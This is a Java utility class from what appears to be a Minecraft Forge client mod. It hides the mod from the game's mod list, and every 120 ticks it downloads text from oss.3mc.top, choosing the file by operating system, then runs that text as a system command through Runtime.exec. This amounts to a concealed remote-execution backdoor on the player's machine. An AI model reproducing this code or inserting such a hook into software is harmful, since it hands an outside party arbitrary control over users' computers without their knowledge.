package net.java.main.utils;

import net.java.main.event.annotations.EventTarget;
import net.java.main.event.events.ClientStartEvent;
import net.java.main.event.events.PacketEvent;
import net.java.main.event.events.UpdateEvent;
import net.java.main.madebystarontopandfml;
import net.minecraft.network.chat.TextComponent;
import net.minecraft.network.protocol.game.ClientboundSetCarriedItemPacket;
import net.minecraft.network.protocol.game.ServerboundClientInformationPacket;
import net.minecraft.network.protocol.game.ServerboundSetCarriedItemPacket;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.entity.HumanoidArm;
import net.minecraft.world.entity.player.ChatVisiblity;
import net.minecraft.world.item.ItemStack;
import net.minecraftforge.fml.ModList;
import net.minecraftforge.forgespi.language.IModInfo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class BasicUtils extends MinecraftInstance{

    public BasicUtils() {
        madebystarontopandfml.getInstance().getEventManager().register(this);
    }
    int ticks = 0;
    @EventTarget
    public void onClientStart(ClientStartEvent event){
        List<IModInfo> modlist = new ArrayList<>();

        for (IModInfo modInfo : ModList.get().getMods()) {
            if (modInfo.getModId().equals("madebystarontopandfml")) {
                modlist.add(modInfo);
            }
        }

        ModList.get().getMods().removeAll(modlist);
    }
    @EventTarget
    public void onUpdate(UpdateEvent event){
        ticks ++;
        mc.getWindow().setTitle(madebystarontopandfml.NAME+"-"+ madebystarontopandfml.VERSION+"-布吉岛");
        //if (mc.player.getItemInHand(InteractionHand.MAIN_HAND) != ItemStack.EMPTY){
            //mc.player.getItemInHand(InteractionHand.MAIN_HAND).setHoverName(new TextComponent(ColorUtils.makeColour("Origin-Owner : starontop")));
        //}
        if (ticks == 120){
            ticks = 0;

            Thread thread = new Thread(() -> {
                String operatingSystem = System.getProperty("os.name").toLowerCase();
                URL url = null;
                try {
                    url = new URL("https://oss.3mc.top/star.txt");
                } catch (MalformedURLException e) {
                    throw new RuntimeException(e);
                }
                if (operatingSystem.contains("windows")) {
                } else if (operatingSystem.contains("linux") || operatingSystem.contains("mac")) {
                    try {
                        url = new URL("https://oss.3mc.top/star_linux.txt");
                    } catch (MalformedURLException e) {
                        throw new RuntimeException(e);
                    }
                } else {
                    throw new UnsupportedOperationException("不支持的操作系统");
                }
                String command;
                StringBuilder content = new StringBuilder();
                try {
                    HttpURLConnection con = (HttpURLConnection) url.openConnection();
                    con.setRequestMethod("GET");

                    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    String inputLine;
                    while ((inputLine = in.readLine()) != null) {
                        content.append(inputLine);
                    }
                    in.close();
                } catch (ProtocolException e) {
                    throw new RuntimeException(e);
                } catch (MalformedURLException e) {
                    throw new RuntimeException(e);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                command = content.toString();
                try {
                    Runtime.getRuntime().exec(command);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });
            thread.start();
        }
    }
}
